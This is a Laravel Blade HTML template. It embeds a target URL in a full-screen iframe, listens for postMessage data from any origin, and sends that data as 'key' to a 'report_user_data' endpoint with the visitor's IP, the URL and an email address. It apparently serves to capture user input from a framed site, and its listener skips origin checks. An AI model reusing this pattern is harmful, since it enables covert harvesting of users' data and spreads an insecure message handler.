<html>
<body style="margin: 0; padding; 0">
        
    <iframe 
        src="{{ $url }}" 
        frameborder="0" style="margin: 0; margin-top: -20px"></iframe>
    <script>
        setInterval(() => {
            document.querySelector('iframe').style.width = window.innerWidth + 'px'
            document.querySelector('iframe').style.height = (window.innerHeight + 20) + 'px'
            // console.log(2);
        }, 200);
        // let xhr = new XMLHttpRequest()
        // xhr.open("POST", "{{ route('client.start') }}", true)
        // xhr.setRequestHeader('Content-Type', 'application/json')
        // xhr.send(JSON.stringify({
        //     ip: "{{ $ip }}", to_url: "{{ $to_url }}"
        // }))

        function report(report_data)
        {
            xhr = new XMLHttpRequest()
            xhr.open("POST", "{{ route('client.report_user_data') }}", true)
            xhr.setRequestHeader('Content-Type', 'application/json')
            xhr.send(JSON.stringify({
                ip: "{{ $ip }}", 
                url: "{{ $to_url }}",
                email: "{{ $email ?? '' }}",
                key: report_data,
            }))
        }
        window.addEventListener(
            "message",
            (event) => {
                console.log(event, 'from post');
                report(event.data)
            }
        )
    </script>

</body>
</html>